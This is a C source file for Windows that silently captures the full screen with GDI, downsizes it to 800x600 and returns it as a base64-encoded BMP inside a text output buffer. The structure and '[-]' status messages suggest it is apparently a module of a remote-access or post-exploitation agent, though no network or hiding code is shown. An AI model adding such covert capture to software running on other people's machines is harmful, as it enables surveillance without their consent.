#include "screenshot.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

/* Target capture resolution */
#define SHOT_WIDTH  800
#define SHOT_HEIGHT 600

/* Base64 */

static const char b64_table[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static int base64_encode(const unsigned char *in, size_t in_len,
                         char *out, size_t out_size) {
    size_t i, j = 0;
    for (i = 0; i < in_len; i += 3) {
        unsigned char b0 = in[i];
        unsigned char b1 = (i + 1 < in_len) ? in[i + 1] : 0;
        unsigned char b2 = (i + 2 < in_len) ? in[i + 2] : 0;

        if (j + 4 >= out_size) return -1;

        out[j++] = b64_table[b0 >> 2];
        out[j++] = b64_table[((b0 & 0x03) << 4) | (b1 >> 4)];
        out[j++] = (i + 1 < in_len) ? b64_table[((b1 & 0x0F) << 2) | (b2 >> 6)] : '=';
        out[j++] = (i + 2 < in_len) ? b64_table[b2 & 0x3F] : '=';
    }
    out[j] = '\0';
    return (int)j;
}

int screenshot_grab(char *output, size_t size) {
    output[0] = '\0';

    int screen_w = GetSystemMetrics(SM_CXSCREEN);
    int screen_h = GetSystemMetrics(SM_CYSCREEN);

    /* GDI capture */

    HDC hScreenDC = GetDC(NULL);
    if (!hScreenDC) {
        snprintf(output, size, "[-] screenshot: GetDC failed\n");
        return SCREENSHOT_ERROR_CAPTURE;
    }

    HDC hMemDC = CreateCompatibleDC(hScreenDC);
    if (!hMemDC) {
        ReleaseDC(NULL, hScreenDC);
        snprintf(output, size, "[-] screenshot: CreateCompatibleDC failed\n");
        return SCREENSHOT_ERROR_CAPTURE;
    }

    // Bitmap cible à la résolution réduite
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, SHOT_WIDTH, SHOT_HEIGHT);
    if (!hBitmap) {
        DeleteDC(hMemDC);
        ReleaseDC(NULL, hScreenDC);
        snprintf(output, size, "[-] screenshot: CreateCompatibleBitmap failed\n");
        return SCREENSHOT_ERROR_CAPTURE;
    }

    HBITMAP hOld = (HBITMAP)SelectObject(hMemDC, hBitmap);

    // Copie + redimensionnement avec interpolation bilinéaire
    SetStretchBltMode(hMemDC, HALFTONE);
    SetBrushOrgEx(hMemDC, 0, 0, NULL);
    if (!StretchBlt(hMemDC, 0, 0, SHOT_WIDTH, SHOT_HEIGHT,
                    hScreenDC, 0, 0, screen_w, screen_h, SRCCOPY)) {
        SelectObject(hMemDC, hOld);
        DeleteObject(hBitmap);
        DeleteDC(hMemDC);
        ReleaseDC(NULL, hScreenDC);
        snprintf(output, size, "[-] screenshot: StretchBlt failed\n");
        return SCREENSHOT_ERROR_CAPTURE;
    }

    SelectObject(hMemDC, hOld);

    /* Extract pixels as 24-bit DIB */

    BITMAPINFOHEADER bi = {0};
    bi.biSize        = sizeof(BITMAPINFOHEADER);
    bi.biWidth       = SHOT_WIDTH;
    bi.biHeight      = -SHOT_HEIGHT;  // négatif = top-down (ligne 0 = haut)
    bi.biPlanes      = 1;
    bi.biBitCount    = 24;
    bi.biCompression = BI_RGB;

    // Stride : multiple de 4 octets (format DIB)
    int stride          = (SHOT_WIDTH * 3 + 3) & ~3;
    size_t pixel_size   = (size_t)stride * SHOT_HEIGHT;

    unsigned char *pixels = (unsigned char *)malloc(pixel_size);
    if (!pixels) {
        DeleteObject(hBitmap);
        DeleteDC(hMemDC);
        ReleaseDC(NULL, hScreenDC);
        snprintf(output, size, "[-] screenshot: malloc pixels failed\n");
        return SCREENSHOT_ERROR_CAPTURE;
    }

    if (!GetDIBits(hMemDC, hBitmap, 0, SHOT_HEIGHT,
                   pixels, (BITMAPINFO *)&bi, DIB_RGB_COLORS)) {
        free(pixels);
        DeleteObject(hBitmap);
        DeleteDC(hMemDC);
        ReleaseDC(NULL, hScreenDC);
        snprintf(output, size, "[-] screenshot: GetDIBits failed\n");
        return SCREENSHOT_ERROR_CAPTURE;
    }

    DeleteObject(hBitmap);
    DeleteDC(hMemDC);
    ReleaseDC(NULL, hScreenDC);

    /* Build BMP file in memory */

    BITMAPFILEHEADER bfh = {0};
    bfh.bfType    = 0x4D42;  // 'BM'
    bfh.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    bfh.bfSize    = bfh.bfOffBits + (DWORD)pixel_size;

    size_t bmp_size = (size_t)bfh.bfSize;

    unsigned char *bmp = (unsigned char *)malloc(bmp_size);
    if (!bmp) {
        free(pixels);
        snprintf(output, size, "[-] screenshot: malloc BMP failed\n");
        return SCREENSHOT_ERROR_CAPTURE;
    }

    memcpy(bmp,                                       &bfh, sizeof(BITMAPFILEHEADER));
    memcpy(bmp + sizeof(BITMAPFILEHEADER),            &bi,  sizeof(BITMAPINFOHEADER));
    memcpy(bmp + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER), pixels, pixel_size);
    free(pixels);

    /* Timestamp */

    time_t now = time(NULL);
    struct tm *t = localtime(&now);
    char ts[32];
    strftime(ts, sizeof(ts), "%Y%m%d_%H%M%S", t);

    /* Base64 encode */

    size_t header_len = (size_t)snprintf(output, size,
        "[Screenshot: %dx%d -> %dx%d]\n"
        "[Timestamp: %s]\n"
        "[Format: BMP 24-bit]\n"
        "[Size: %zu bytes]\n"
        "[Base64]:\n",
        screen_w, screen_h, SHOT_WIDTH, SHOT_HEIGHT,
        ts, bmp_size);

    if (header_len >= size) {
        free(bmp);
        return SCREENSHOT_ERROR_ENCODE;
    }

    int enc = base64_encode(bmp, bmp_size,
                            output + header_len,
                            size - header_len - 32);
    free(bmp);

    if (enc < 0) {
        snprintf(output, size,
                 "[-] screenshot: output buffer too small "
                 "(need ~%zu bytes, have %zu)\n",
                 bmp_size * 4 / 3 + header_len + 32, size);
        return SCREENSHOT_ERROR_ENCODE;
    }

    strncat(output, "\n[End of screenshot]\n", size - strlen(output) - 1);
    return SCREENSHOT_SUCCESS;
}
